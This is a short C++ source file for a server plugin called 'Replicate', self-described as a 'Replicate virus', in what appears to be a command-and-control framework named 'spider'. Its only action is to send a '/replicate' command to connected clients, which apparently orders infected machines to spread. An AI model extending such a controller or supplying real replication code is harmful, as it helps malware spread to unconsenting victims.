#if defined _WIN32
#include <windows.h>
#endif

#include <iostream>
#include <sstream>
#include "Replicate.h"
#include "IClient.h"

Replicate::Replicate() : m_name("replicate"), m_description("Replicate virus")
{
}

std::string const &Replicate::getName() const
{
  return m_name;
}

std::string const &Replicate::getDescription() const
{
  return m_description;
}

void Replicate::command(spider::server::IClient *cli, void const *)
{
  static std::string const cmd = "/replicate\r\n";
  cli->send(cmd);
}

static Replicate plugin;

// The entry point called by the server
extern "C" {
SPIDER_API spider::server::IPlugin *getPlugin()
{
  return static_cast<spider::server::IPlugin *>(&plugin);
}

#if defined _WIN32
BOOLEAN WINAPI DllMain(HINSTANCE hDllHandle, DWORD nReason, LPVOID Reserved)
{
  return (true);
}
#endif
}
